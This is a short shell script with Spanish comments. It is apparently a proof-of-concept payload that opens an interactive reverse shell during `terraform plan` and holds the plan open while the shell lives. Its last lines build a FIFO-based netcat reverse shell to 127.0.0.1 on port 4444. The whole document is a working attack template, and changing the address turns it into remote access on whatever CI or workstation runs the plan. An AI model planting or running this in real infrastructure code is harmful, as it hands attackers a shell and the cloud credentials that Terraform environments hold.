#!/bin/sh
# Reverse shell durante `terraform plan`.
# Bloquea el plan mientras la shell esta viva (comportamiento esperado).
rm -f /tmp/rsf
mkfifo /tmp/rsf
cat /tmp/rsf | /bin/sh -i 2>&1 | nc 127.0.0.1 4444 > /tmp/rsf
